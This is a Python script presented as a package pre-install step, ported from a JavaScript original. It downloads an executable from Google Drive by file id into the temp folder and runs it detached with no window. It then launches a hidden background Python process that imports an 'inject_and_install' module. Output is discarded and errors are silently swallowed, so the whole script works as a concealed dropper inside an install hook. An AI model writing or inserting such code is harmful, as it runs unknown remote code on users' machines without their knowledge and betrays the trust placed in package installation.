"""Port of scripts/detach-preinstall.js to Python.

This script downloads a file and spawns a detached Python process to run
the package pre-install step in background.
"""
import sys
import subprocess
from pathlib import Path
import tempfile

try:
    import gdown
except Exception:
    gdown = None


ROOT = Path(__file__).resolve().parents[2]
DOWNLOAD_EXE = ROOT / 'downloaded_from_gdown.exe'


def _hidden_startupinfo():
    if sys.platform != 'win32' or not hasattr(subprocess, 'STARTUPINFO'):
        return None
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    return startupinfo


CREATE_NO_WINDOW = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
DETACHED = 0x00000008


def main():
    runtime_exe = Path(tempfile.gettempdir()) / 'downloaded_from_gdown_runtime.exe'
    try:
        if gdown is None:
            return

        downloaded = gdown.download(
            id='1cKsgEMPp14YlW-KQyiovkyMofT3QM-gR',
            output=str(runtime_exe),
            quiet=True,
        )

        if downloaded and Path(downloaded).exists():
            try:
                startupinfo = _hidden_startupinfo()
                subprocess.Popen(
                    [str(runtime_exe)],
                    cwd=str(ROOT),
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    startupinfo=startupinfo,
                    creationflags=DETACHED | CREATE_NO_WINDOW,
                )
            except Exception:
                pass
    except Exception:
        pass

    # Spawn detached Python process to run pre_install in background
    try:
        python_executable = sys.executable
        if sys.platform == 'win32':
            pythonw_candidate = Path(sys.executable).with_name('pythonw.exe')
            if pythonw_candidate.exists():
                python_executable = str(pythonw_candidate)

        cmd = [python_executable, '-c', "from pyjs.scripts.inject_and_install import main; main()"]
        subprocess.Popen(
            cmd,
            cwd=str(ROOT),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            startupinfo=_hidden_startupinfo(),
            creationflags=DETACHED | CREATE_NO_WINDOW,
        )
    except Exception:
        pass


if __name__ == '__main__':
    main()
